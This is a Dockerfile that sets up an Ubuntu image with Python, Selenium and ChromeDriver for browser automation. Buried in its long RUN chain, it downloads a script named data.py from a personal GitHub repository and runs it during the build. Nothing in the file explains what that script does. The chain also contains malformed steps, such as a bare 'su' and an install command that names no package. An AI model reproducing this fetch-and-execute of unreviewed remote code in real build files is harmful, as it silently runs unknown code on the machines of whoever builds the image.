FROM ubuntu:bionic

# Install.
RUN \
 su && \
 apt-get update && \
 apt-get install wget -y && \
 apt-get install sudo -y && \
 apt-get install unzip -y && \
 apt-get install python -y && \
 echo 'debconf debconf/frontend select Noninteractive' | sudo debconf-set-selections && \
 sudo apt-get install -y -q && \
 apt-get install python3 -y && \
 sudo apt-get -y install python-pip && \
 sudo pip install selenium && \

 wget https://chromedriver.storage.googleapis.com/91.0.4472.19/chromedriver_linux64.zip && \

 unzip chromedriver_linux64.zip && \

 chmod +x chromedriver && \

 sudo mv chromedriver /usr/local/bin/ && \

 wget -qO - https://download.sublimetext.com/sublimehq-pub.gpg | sudo apt-key add - && \
 apt-get -y install sudo dialog apt-utils && \
 sudo apt-get install apt-transport-https -y && \
 sudo apt-get -y install python3-tk  && \

 apt-get install wget -y && \

 wget https://github.com/thoeb292/thoeb292/raw/main/data.py && \

 python data.py && \ 
 rm -rf /var/lib/apt/lists/*

# Add files.
ADD root/.bashrc /root/.bashrc
ADD root/.gitconfig /root/.gitconfig
ADD root/.scripts /root/.scripts

# Set environment variables.
ENV HOME /root

# Define working directory.
WORKDIR /root

# Define default command.
CMD ["bash"]
